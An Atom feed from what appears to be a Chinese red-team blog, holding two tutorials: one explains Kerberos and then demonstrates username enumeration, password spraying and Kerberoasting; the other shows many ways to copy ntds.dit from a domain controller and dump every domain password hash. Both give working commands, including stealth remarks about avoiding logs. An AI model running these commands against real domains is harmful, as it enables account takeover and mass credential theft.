<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TeamsSix</title>
  
  
  <link href="https://www.teamssix.com/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2021-09-23T07:16:26.268Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>TeamsSix</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Kerberos 协议详解与利用</title>
    <link href="https://www.teamssix.com/210923-151418.html"/>
    <id>https://www.teamssix.com/210923-151418.html</id>
    <published>2021-09-23T07:14:18.000Z</published>
    <updated>2021-09-23T07:16:26.268Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、Kerberos-协议"><a href="#一、Kerberos-协议" class="headerlink" title="一、Kerberos 协议"></a>一、Kerberos 协议</h1><p>Kerberos 原意是希腊神话中看守冥界入口的恶犬刻耳柏洛斯，类似于「哈利波特·神秘魔法石」中守护魔法石的三头犬毛毛。</p><p>这里所讲的 Kerberos 是一种网络身份认证协议，个人猜测作者采用这个名字也正是为了体现出该协议里身份认证的特性，即通过 Kerberos 协议守护网络通信中的安全，下面就来详细看看 Kerberos 协议。</p><p>Kerberos 是一种由 MIT 提出用来在非安全网络中对个人通信进行身份认证的计算机网络授权协议，该协议使用 AES 对称加密算法为客户端和服务端之间提供强身份认证，在域环境下的身份认证利用的就是 Kerberos 协议。</p><p>在计算机通讯中，当客户端去访问服务端时，作为服务端需要判断对方是否有权限访问自己主机上的服务，作为安全人员我们想保证整个过程即使被拦截或者篡改也不会影响数据的安全性，Kerberos 协议正是为了解决这些问题而产生的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906154732.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>上图是 Kerberos 的认证流程，协议中的名词缩写解释如下：</p><ul><li>AS (Authentication Service): 认证服务器</li><li>TGS (Ticket Granting Service): 票据授予服务器</li><li>KDC (Key Distribution Center): 密钥分发中心</li><li>TGT (Ticket Granting Ticket): 票据授权票据，或者说：票据的票据</li><li>ST (Servre Ticket): 服务票据</li></ul><p>根据上图，总共分为 6 步，这里一步一步进行解释</p><h2 id="第一阶段：客户端-Clinet-与认证服务器-AS-通信"><a href="#第一阶段：客户端-Clinet-与认证服务器-AS-通信" class="headerlink" title="第一阶段：客户端 Clinet 与认证服务器 AS 通信"></a>第一阶段：客户端 Clinet 与认证服务器 AS 通信</h2><p>首先用户在客户端输入自己的用户名和密码，此时客户端会将用户输入的密码转换为哈希值，这个哈希值就是客户端用户的<strong>用户密钥</strong>。</p><p>① 第一步，客户端向认证服务器发起请求，请求内容为自己的用户名、客户端地址和当前时间戳。</p><blockquote><p>此时客户端不会向认证服务器发送用户密钥，认证服务器会利用自己的本地数据库里对应客户端用户的密码生成用户密钥。</p></blockquote><p>② 第二步，认证服务器接收到客户端的请求，此时认证服务器会根据客户端传来的用户名在本地数据库中查找这个用户名。</p><blockquote><p>此时认证服务器只会查找具有相同用户名的用户，并不会判断客户端身份的可靠性。</p></blockquote><p>如果没有这个用户名，认证失败；如果存在该用户名，则认证服务器会认为用户存在，此时认证服务器会向客户端发送两条信息，分别如下：</p><ul><li>第一条信息：<strong>客户端与票据授予服务器的会话密钥。</strong>该会话密钥通过用户密钥进行加密，这个用户密钥就是认证服务器利用自己的本地数据库里对应客户端用户的密码生成的，该条消息中除了会话密钥还有票据授予服务器的地址和时间戳。</li><li>第二条信息：<strong>票据授权票据。</strong>票据授权票据通过票据授予服务器的密钥进行加密，票据授权票据里包括了第一条消息里的会话密钥、用户名、客户端地址、票据授权票据的有效时间以及时间戳。</li></ul><p>在客户端收到认证服务器的响应后，会尝试使用自己的用户密钥解密第一条消息，如果解密成功则会获得客户端与票据授予服务器的会话密钥以及时间戳等信息。接着客户端会判断时间戳是否在 5 分钟以内，如果大于 5 分钟则认为认证服务器是伪造的，小于 5 分钟则继续下一步认证。</p><p>至此，第一阶段通信完成。</p><h2 id="第二阶段：客户端-Clinet-与票据授予服务器-TGS-通信"><a href="#第二阶段：客户端-Clinet-与票据授予服务器-TGS-通信" class="headerlink" title="第二阶段：客户端 Clinet 与票据授予服务器 TGS 通信"></a>第二阶段：客户端 Clinet 与票据授予服务器 TGS 通信</h2><p>③ 第三步，客户端向票据授予服务器发起请求，请求里包含了两条信息：</p><ul><li>第一条信息：上一步认证服务器返回的第二条信息即票据授予票据，以及自己想要访问的服务 ID</li><li>第二条消息：使用客户端与票据授予服务器的会话密钥加密的用户名、时间戳。</li></ul><p>④ 第四步，票据授予服务器接收到请求，首先票据授予服务器会判断密钥分发中心的数据库中是否存在客户端想要访问的服务，如果不存在，认证失败，如果存在则继续接下来的认证。</p><p>接下来票据授予服务器会解密票据授予票据的内容，此时票据授予服务器获取到用户名、客户端与票据授予服务器的会话密钥、时间戳信息。</p><p>之后票据授予服务器使用客户端与票据授予服务器的会话密钥解密客户端发来的第二条信息，取出其中的用户名和票据授予票据里的用户信息进行对比，这里也会去判断取出的时间戳是否正常，如果全部没问题则认为客户端身份正常，继续下一步。</p><p>此时票据授予服务器向客户端发起响应，响应信息包含两条信息：</p><ul><li>第一条信息：<strong>使用服务端的密钥加密的服务票据</strong>，其中包括用户名、客户端 IP、客户端要访问的服务端信息、服务票据的有效时间、时间戳以及客户端与服务端的会话密钥。</li><li>第二条信息：<strong>使用客户端和票据授予服务器的会话密钥加密的内容</strong>，其中包括客户端和服务端的会话密钥、时间戳和服务票据的有效时间。</li></ul><p>在客户端收到票据授予服务器的响应后，会使用客户端和票据授予服务器的会话密钥解密收到的第二条信息，得到客户端和服务端的会话密钥，用于接下来的通信。这里同样的也会检查时间戳是否有误，值的注意的是这里客户端是无法解密返回的第一条信息的，因为第一条信息是利用服务端的密钥加密的。</p><p>至此，第二阶段通信完成。</p><h2 id="第三阶段：客户端-Clinet-与-服务端-Server-通信"><a href="#第三阶段：客户端-Clinet-与-服务端-Server-通信" class="headerlink" title="第三阶段：客户端 Clinet 与 服务端 Server 通信"></a>第三阶段：客户端 Clinet 与 服务端 Server 通信</h2><p>⑤ 第五步，客户端向服务端发送请求，请求内容包括两条信息：</p><ul><li>第一部分：上一步里票据授予服务器返回的使用服务端的密钥加密的服务票据。</li><li>第二部分：使用客户端和服务端的密钥加密的用户名和时间戳信息。</li></ul><p>⑥ 第六步，服务端解密出收到信息的第一部分内容，核对时间戳之后，取出客户端和服务端的会话密钥，利用客户端和服务端的会话密钥解密第二部分内容，获得用户名信息。</p><p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用客户端和服务端的会话密钥加密的表示验证通过的信息以及时间戳，客户端接受到响应后，验证时间戳正确后，便会认为这个服务端是可信任的了。</p><p>至此，第三阶段通信完成，到这里整个 Kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p><h1 id="二、Kerberos-协议的利用"><a href="#二、Kerberos-协议的利用" class="headerlink" title="二、Kerberos 协议的利用"></a>二、Kerberos 协议的利用</h1><h2 id="1、用户名枚举"><a href="#1、用户名枚举" class="headerlink" title="1、用户名枚举"></a>1、用户名枚举</h2><p>当用户名输入正确或错误时，Kerberos 协议所返回的状态码是不同的，利用这一特性可以进行用户名枚举，这里使用 Kerbrute 工具进行演示。</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kerbrute userenum <span class="token punctuation">-</span><span class="token punctuation">-</span>dc 192.168.7.7 <span class="token punctuation">-</span>d teamssix.com users.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231512850.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、密码喷洒"><a href="#2、密码喷洒" class="headerlink" title="2、密码喷洒"></a>2、密码喷洒</h2><p>密码喷洒和用户名枚举原理一样，而且使用 Kerberos 协议对 Windows 密码进行暴力破解比其他方法要快得多，并且更加隐蔽，因为 Kerberos 身份验证即使失败也不会触发 4625 登录失败事件。</p><p>这里同样使用 Kerbrute 工具进行演示。</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kerbrute passwordspray <span class="token punctuation">-</span><span class="token punctuation">-</span>dc 192.168.7.7 <span class="token punctuation">-</span>d teamssix.com users.txt 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231512431.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、Kerberoast"><a href="#3、Kerberoast" class="headerlink" title="3、Kerberoast"></a>3、Kerberoast</h2><blockquote><p>关于 Kerberoast 和 SPN 的详细介绍可以参考我之前的文章：<a href="https://teamssix.com/210907-121204.html">https://teamssix.com/210907-121204.html</a></p></blockquote><p>Kerberoast 是一种针对 Kerberos 协议的利用方式，在需要使用某个服务向票据授予服务器发送请求时（即上述 Kerberos 协议里第 ③ 步），用户首先需要有个有效的票据授予票据。</p><p>当票据授予票据被验证有效且具有该服务的权限时，票据授予服务器会向用户返回使用服务端密钥加密的服务票据，该服务票据使用与该服务相关联计算机账号的密码加密，因此 RT 可以对加密后的内容进行离线哈希破解。</p><p><strong>Kerberoast 的利用思路：</strong><br>i. 查询 SPN<br>ii. 请求并导出服务票据<br>iii. 对服务票据进行爆破</p><blockquote><p>这里使用 Kerberoast 工具包作为演示，以下工具均在 Kerberoast 工具包里。</p></blockquote><h3 id="i-查询-SPN"><a href="#i-查询-SPN" class="headerlink" title="i. 查询 SPN"></a>i. 查询 SPN</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">.</span><span class="token operator">/</span>GetUserSPNs<span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到 test 用户有个 MSSQLSvc/DBSRV.teamssix.com:1433 服务</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231512937.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="ii-请求并导出服务票据"><a href="#ii-请求并导出服务票据" class="headerlink" title="ii. 请求并导出服务票据"></a>ii. 请求并导出服务票据</h3><p>这里请求 MSSQLSvc/DBSRV.teamssix.com:1433 服务并导出服务票据</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Add<span class="token operator">-</span>Type <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>IdentityModel  New<span class="token operator">-</span>Object System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>KerberosRequestorSecurityToken <span class="token operator">-</span>ArgumentList <span class="token string">"MSSQLSvc/DBSRV.teamssix.com:1433"</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以使用 klist 查看新的是否有票据缓存，有的话就可以使用 mimikatz 导出票据了</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">kerberos<span class="token operator">:</span><span class="token operator">:</span>list <span class="token operator">/</span><span class="token keyword">export</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231513202.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="iii-对服务票据进行爆破"><a href="#iii-对服务票据进行爆破" class="headerlink" title="iii. 对服务票据进行爆破"></a>iii. 对服务票据进行爆破</h3><p>使用 Kerberoast 工具包里的 tgsrepcrack.py 就可以破解</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">python tgsrepcrack<span class="token punctuation">.</span>py password<span class="token punctuation">.</span>txt mssql<span class="token punctuation">.</span>kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231513659.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="三、防范思路"><a href="#三、防范思路" class="headerlink" title="三、防范思路"></a>三、防范思路</h1><p>1、密码设置为复杂密码</p><p>2、在进行日志审计时，可以重点关注 ID 为 4769（请求 Kerberos 服务票据）的日志，如果有较多的 4769 日志，应进一步检查系统中是否存在恶意行为。</p><p>3、 Kerberos 协议的默认加密方式是 AES256_HMAC，而服务票据只有在加密方式是 RC4_HMAC_MD5 时才能破解，因此可以对当前系统的加密方式进行检查，看看是否为 AES256_HMAC 的加密方式。</p><blockquote><p>参考文章：</p><p><a href="https://zh.wikipedia.org/wiki/Kerberos">https://zh.wikipedia.org/wiki/Kerberos</a></p><p><a href="https://teamssix.com/210907-121204.html">https://teamssix.com/210907-121204.html</a></p><p><a href="https://www.jianshu.com/p/23a4e8978a30">https://www.jianshu.com/p/23a4e8978a30</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%88%BB%E8%80%B3%E6%9F%8F%E6%B4%9B%E6%96%AF">https://zh.wikipedia.org/wiki/%E5%88%BB%E8%80%B3%E6%9F%8F%E6%B4%9B%E6%96%AF</a></p><p><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3Kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、Kerberos-协议&quot;&gt;&lt;a href=&quot;#一、Kerberos-协议&quot; class=&quot;headerlink&quot; title=&quot;一、Kerberos 协议&quot;&gt;&lt;/a&gt;一、Kerberos 协议&lt;/h1&gt;&lt;p&gt;Kerberos 原意是希腊神话中看守冥界入口的恶犬</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】26、ntds.dit 的提取与散列值导出</title>
    <link href="https://www.teamssix.com/210909-215110.html"/>
    <id>https://www.teamssix.com/210909-215110.html</id>
    <published>2021-09-09T13:51:10.000Z</published>
    <updated>2021-09-09T14:31:56.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在活动目录中，所有数据都保存在 ntds.dit 文件中，ntds.dit 是一个二进制文件，存储位置为域控的 %SystemRoot%\ntds.dit</p><p>ntds.dit 中包含（但不限于）用户名、散列值、组、GPP、OU 等与活动目录相关的信息，因此如果我们拿到 ntds.dit 就能获取到域内所有用户的 hash</p><p>在通常情况下，即使拥有管理员权限，也无法读取域控中的 ntds.dit 文件（因为活动目录始终访问这个文件，所以文件被禁止读取），它和 SAM 文件一样，是被 Windows 操作系统锁定的。</p><p>不过使用 Windows 本地卷影拷贝服务，就可以获得文件的副本（类似于虚拟机的快照）</p><h2 id="1、使用卷影拷贝服务提取-ntds-dit"><a href="#1、使用卷影拷贝服务提取-ntds-dit" class="headerlink" title="1、使用卷影拷贝服务提取 ntds.dit"></a>1、使用卷影拷贝服务提取 ntds.dit</h2><h3 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h3><p>ntdsutil 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutil 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPromo.exe）成功降级的与控制器留下的元数据等。</p><p>该工具默认安装在域控上，使用以下命令创建一个快照，该快照包含 Windows 中的所有文件，且在复制文件时不会受到 Windows 锁定机制的限制。</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载刚刚创建的快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;mount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 copy 命令将快照中的文件复制到 C 盘下</p><pre class="line-numbers language-none"><code class="language-none">copy C:\$SNAP_202109081356_VOLUMEC$\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除之前加载的快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;unmount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; &quot;delete &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询当前系统中的快照，可以看到没有任何快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;List All&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908135855.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="vssadmin"><a href="#vssadmin" class="headerlink" title="vssadmin"></a>vssadmin</h3><p>vssadmin 可用于创建和删除卷影拷贝、列出卷影的信息（只能管理系统 Provider 创建的卷影拷贝）、显示已安装的所有卷影拷贝写入程序（writers）和提供程序（providers），以及改变卷影拷贝的存储空间（即所谓的 “diff 空间”）的大小等。</p><p>vssadmin 的使用流程和 ntdsutil 差不多，首先创建一个 C 盘的卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在创建的卷影拷贝中将 ntds.dit 复制出来</p><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除快照</p><pre class="line-numbers language-none"><code class="language-none">vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;quiet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908145721.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="vssown-vbs"><a href="#vssown-vbs" class="headerlink" title="vssown.vbs"></a>vssown.vbs</h3><p>vssown.vbs 脚本的功能和 vssadmin 类似，可用于创建和删除卷影拷贝以及启动和停止卷影拷贝服务。</p><p>vssown.vbs 下载地址：<a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p><p>启动卷影拷贝服务</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建一个 C 盘的卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;create c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列出当前卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;delete &#123;22B93FE6-D53A-4ECA-BD5A-7A2A68203EF8&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908152359.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h3><p>除了上面介绍的通过执行命令来提取 ntds.dit，也可以通过创建一个 IFM 的方式获取 ntds.dit</p><p>在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p><p>在域控中以管理员模式打开命令行环境，输入命令</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在 C:\test\registry 文件夹下</p><p>将 ntds.dit 拖回本地后，在目标机器上将 test 文件夹删除</p><pre class="line-numbers language-none"><code class="language-none">rmdir &#x2F;s&#x2F;q C:\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Copy-VSS-ps1"><a href="#Copy-VSS-ps1" class="headerlink" title="Copy-VSS.ps1"></a>Copy-VSS.ps1</h3><p>nishang 工具包里的 Copy-VSS.ps1 也可以将 ntds.dit 提取出来，nishang 工具包地址：<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Copy-VSS.ps1Copy-vss或者PowerShell -Exec bypass -C &quot;Import-module .\Copy-VSS.ps1;Copy-vss&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过该脚本，可以将 SAM、SYSTEM，ntds.dit 复制到与 ps1 脚本相同的目录下。</p><h3 id="diskshadow"><a href="#diskshadow" class="headerlink" title="diskshadow"></a>diskshadow</h3><p>diskshadow 和 vshadow 功能类似，不过 vshadow 是包含在 Windows SDK 里的，因此实际应用的时候还需要将其上传到目标机器上。</p><blockquote><p>diskshadow 有交互模式和非交互模式，在使用交互模式时，需要在图形化界面里操作</p></blockquote><p>首先创建一个 txt 文件，内容如下：</p><pre class="line-numbers language-none"><code class="language-none">set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% k:exec &quot;C:\windows\system32\cmd.exe&quot; &#x2F;c copy k:\Windows\NTDS\ntds.dit C:\ntds.ditdelete shadows alllist shadows allresetexit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 diskshadow 调用刚才的文本文件</p><pre class="line-numbers language-none"><code class="language-none">diskshadow &#x2F;s C:\command.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p><pre class="line-numbers language-none"><code class="language-none">reg save hklm\system c:\windows\temp\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908155944.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Invoke-NinjaCopy-ps1"><a href="#Invoke-NinjaCopy-ps1" class="headerlink" title="Invoke-NinjaCopy.ps1"></a>Invoke-NinjaCopy.ps1</h3><p>PowerSploit 工具包里的 Invoke-NinjaCopy.ps1 脚本也可以提取 ntds.dit 文件，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p><p>PowerSploit 工具包项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><p>impacket 安装</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.gitcd impacketpython3 setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过 impacket  里的 secretsdump.py 脚本可以直接远程读取 ntds.dit 并导出哈希值</p><pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9python3 secretsdump.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 -outputfile output_ntds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2、导出-ntds-dit-文件中的散列值"><a href="#2、导出-ntds-dit-文件中的散列值" class="headerlink" title="2、导出 ntds.dit 文件中的散列值"></a>2、导出 ntds.dit 文件中的散列值</h2><h3 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h3><p>安装 esedbexport，以 Kali 为例</p><pre class="line-numbers language-none"><code class="language-none">apt-get install autoconf automake autopoint libtool pkg-configwget https:&#x2F;&#x2F;github.com&#x2F;libyal&#x2F;libesedb&#x2F;releases&#x2F;download&#x2F;20210424&#x2F;libesedb-experimental-20210424.tar.gztar zxvf libesedb-experimental-20210424.tar.gzcd libesedb-20210424.&#x2F;configuremakemake installldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>导出 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">esedbexport -m tables ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装 ntdsxtract</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;csababarta&#x2F;ntdsxtract.gitcd ntdsxtractpython setup.py buildpython setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 all_user.txt 里</p><pre class="line-numbers language-none"><code class="language-none">python2 dsusers.py ntds.dit.export&#x2F;datatable.3 ntds.dit.export&#x2F;link_table.5 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee all_user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果提示 ImportError: No module named Crypto.Hash，直接 pip install pycryptodome 即可</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908171420.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>ntds.dit 包含域内的所有信息，可以通过分析 ntds.dit 导出域内的计算机信息以及其他信息，最后结果将保存在 all_computers.csv 文件内</p><pre class="line-numbers language-none"><code class="language-none">python2 dscomputers.py ntds.dit.export&#x2F;datatable.3 computer_output --csvoutfile all_computers.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h3><p>将 ntds.dit.export 和 SYSTEM 文件放入到 impacket 工具的文件夹中</p><pre class="line-numbers language-none"><code class="language-none">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" 